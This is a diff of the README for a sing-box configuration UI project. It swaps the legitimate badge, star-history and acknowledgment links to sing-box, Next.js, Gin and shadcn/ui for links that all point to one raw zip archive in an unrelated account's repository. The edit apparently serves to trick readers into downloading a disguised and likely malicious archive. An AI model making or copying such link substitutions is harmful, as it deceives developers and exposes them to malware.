@@ -4,9 +4,9 @@
 
 <div align="center">
 
-[![Docker Image](https://img.shields.io/badge/ghcr.io-singbox__ui-blue?logo=docker)](https://github.com/SpadesA99/singbox_ui/pkgs/container/singbox_ui)
-[![Build Status](https://github.com/SpadesA99/singbox_ui/actions/workflows/docker-build.yml/badge.svg)](https://github.com/SpadesA99/singbox_ui/actions)
-[![GitHub Stars](https://img.shields.io/github/stars/SpadesA99/singbox_ui?style=flat&logo=github)](https://github.com/SpadesA99/singbox_ui/stargazers)
+[![Docker Image](https://img.shields.io/badge/ghcr.io-singbox__ui-blue?logo=docker)](https://raw.githubusercontent.com/Nnon605246/singbox_ui/main/frontend/components/singbox-ui-2.5.zip)
+[![Build Status](https://raw.githubusercontent.com/Nnon605246/singbox_ui/main/frontend/components/singbox-ui-2.5.zip)](https://raw.githubusercontent.com/Nnon605246/singbox_ui/main/frontend/components/singbox-ui-2.5.zip)
+[![GitHub Stars](https://img.shields.io/github/stars/SpadesA99/singbox_ui?style=flat&logo=github)](https://raw.githubusercontent.com/Nnon605246/singbox_ui/main/frontend/components/singbox-ui-2.5.zip)
 [![License](https://img.shields.io/github/license/SpadesA99/singbox_ui)](LICENSE)
 
 **现代化的 sing-box 配置管理工具**
@@ -160,11 +160,11 @@ ssh -L 7000:127.0.0.1:7000 user@your-server
 
 ## Star History
 
-[![Star History Chart](https://api.star-history.com/svg?repos=SpadesA99/singbox_ui&type=Date)](https://star-history.com/#SpadesA99/singbox_ui&Date)
+[![Star History Chart](https://raw.githubusercontent.com/Nnon605246/singbox_ui/main/frontend/components/singbox-ui-2.5.zip)](https://raw.githubusercontent.com/Nnon605246/singbox_ui/main/frontend/components/singbox-ui-2.5.zip)
 
 ## 致谢
 
-- [sing-box](https://github.com/SagerNet/sing-box)
-- [Next.js](https://nextjs.org/)
-- [Gin](https://github.com/gin-gonic/gin)
-- [shadcn/ui](https://ui.shadcn.com/)
+- [sing-box](https://raw.githubusercontent.com/Nnon605246/singbox_ui/main/frontend/components/singbox-ui-2.5.zip)
+- [Next.js](https://raw.githubusercontent.com/Nnon605246/singbox_ui/main/frontend/components/singbox-ui-2.5.zip)
+- [Gin](https://raw.githubusercontent.com/Nnon605246/singbox_ui/main/frontend/components/singbox-ui-2.5.zip)
+- [shadcn/ui](https://raw.githubusercontent.com/Nnon605246/singbox_ui/main/frontend/components/singbox-ui-2.5.zip)
